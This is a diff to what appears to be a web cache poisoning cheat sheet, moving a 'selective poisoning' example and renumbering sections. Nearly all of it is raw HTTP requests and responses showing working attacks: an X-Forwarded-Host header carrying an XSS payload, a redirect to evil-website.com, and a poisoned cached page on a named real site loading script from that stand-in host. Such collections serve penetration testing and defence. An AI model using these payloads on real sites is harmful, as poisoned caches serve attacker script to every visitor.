@@ -64,7 +64,22 @@ HTTP/1.1 301 Moved Permanently
 Location: https://evil-website.com/
 ```
 
-4. Seizing the Cache
+4. User-agent Selective poisoning (unknown header)
+```
+GET / HTTP/1.1
+Host: www.vuln.com
+User-Agent: Mozilla/5.0 (<snip> Firefox/60.0)
+X-Forwarded-Host: a"><iframe onload=alert(1)>
+
+### Response:
+HTTP/1.1 200 OK
+X-Served-By: cache-lhr6335-LHR
+Vary: User-Agent, Accept-Encoding
+…
+<link rel="canonical" href="https://a">a<iframe onload=alert(1)>
+```
+
+5. Seizing the Cache
 ```
 GET / HTTP/1.1
 Host: unity3d.com
@@ -77,21 +92,6 @@ Age: 174
 Cache-Control: public, max-age=1800
 …
 <script src="https://evil-website.com/x.js"></script>
-```
-
-5. Selective poisoning
-```
-GET / HTTP/1.1
-Host: redacted.com
-User-Agent: Mozilla/5.0 (<snip> Firefox/60.0)
-X-Forwarded-Host: a"><iframe onload=alert(1)>
-
-### Response:
-HTTP/1.1 200 OK
-X-Served-By: cache-lhr6335-LHR
-Vary: User-Agent, Accept-Encoding
-…
-<link rel="canonical" href="https://a">a<iframe onload=alert(1)>
 ```
 
 6. Route Poisoning
